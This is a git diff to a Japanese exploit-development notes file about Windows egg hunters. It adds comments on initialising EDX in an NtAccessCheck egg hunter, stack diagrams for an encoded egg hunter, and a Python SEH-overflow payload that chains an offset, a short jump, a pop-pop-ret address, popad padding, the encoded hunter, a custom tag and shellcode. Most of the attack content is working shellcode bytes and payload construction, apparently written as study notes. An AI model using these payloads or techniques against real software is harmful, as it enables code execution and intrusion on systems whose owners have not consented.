@@ -2979,9 +2979,15 @@ egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
 ```
 Egg hunter using NtAccessCheck (AndAuditAlarm)   
 ```txt
+前提条件：
+edxはタグを探索するアドレスを順次入れていくので、初期化されているorスタックのアドレスなどの必要がある。
+popadとかで変な値が入っている場合はxor edx,edxで初期化命令をegghunterのはじめに追加する必要がある。
+
 # Egg hunter size = 32 bytes, Egg size = 8 bytes
 6681CAFF0F  or dx,0x0fff   ; はじめはedx=0x00000000に0x0fffを代入。
                            ; 2回目のループでは0x00001000に0xfffを代入して、0x00001fffとなる。
+                           ; 初めにedxが0で初期化されていない場合、xor edx,edxで初期化する必要がある場合がある
+                           ; popadをしまくった結果edxに0x41414141とかが入っていると0x41414fffから探し始めてしまうので注意！
 42          inc edx        ; acts as a counter
                            ;(increments the value in EDX)
 52          push edx       ; pushes edx value to the  stack
@@ -3022,7 +3028,42 @@ egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xE
 egghunter += "\x77\x30\x30\x74" # this is the marker/tag: w00t
 egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
 ```
-Omlet-Hunter   
+**encoded egghunter**  
+ファイル名に使えるような文字しか使えない場合、egghunterはこのままではだめなのでEncodeしたものを使う必要がある。  
+Encodeされたenc_egghunterを実行したあとは以下のようにして、復元したegghunterを実行するようにする。   
+```txt
+enc_egghunter実行前
+|               |
+| enc_egghunter | <- eip  eipはenc_egghunterを指しているようにする 
+|      nop      |
+|      nop      | <- esp  espを基準に復元されたものがpushされるので、余裕をもった後方に設定する
+|      nop      |
+
+enc_egghunter実行後(元のegghunterを復元後)
+|               |
+| enc_egghunter | 
+|      nop      | <- eip  enc_egghunter実行後、NOPスレッドに突入する
+|   egghunter   | <- 復元されたEgghunterが現れる！このままNOPを降りていくとここを実行するようになる 
+|      nop      |
+```
+```python
+#nasm > jae $+0x23
+#00000000  7321              jnc 0x23
+
+# offset + jmp forward + poppopret + nop
+payload = "A"*294 + "\x73\x21\x41\x41" + "\x7b\x46\x7e\x6d" + "\x41"*0x30
+# popad + enc_egghunter + nop
+# enc_egghunterを実行する前にpopadでespをenc_egghunterの存在するより下の方に設定する。
+# すると、元のegghunterを再現し終わり、NOPを実行し、再現したegghunterにたどり着く
+payload = payload + "\x61"*64 + enc_egghunter + "\x41"*500
+
+# tag is "\x80\x81\x82\x83". not using 0x21-0x7f because corrupted shellcode in stack is trigared
+# "w00t"をタグに設定すると、スタック上にも"w00t"が存在することになりそっちのShellcodeが実行されることになる
+# しかし、実際に実行したいのはShellcodeが壊れていないHeapにあるShellcodeなので、あえてスタック上のタグが壊れるようにする
+payload = payload + "\x80\x81\x82\x83"*2 + buf
+```
+
+##### Omlet-Hunter   
 - `w32_SEH_omelet.py w32_SEH_omelet.bin calc.bin calceggs.txt 127 0xBADA55`   
 `calc.bin`のシェルコードを分割して、calceggs.txtに用意する。127サイズ以下に分割して、マーカーは`0xbada55`に設定。   
 omlet-hunterはタグを頼りに、全ての分割されたeggを見つけて、元のshellcodeをスタックの最後の方に復元して、実行する。   
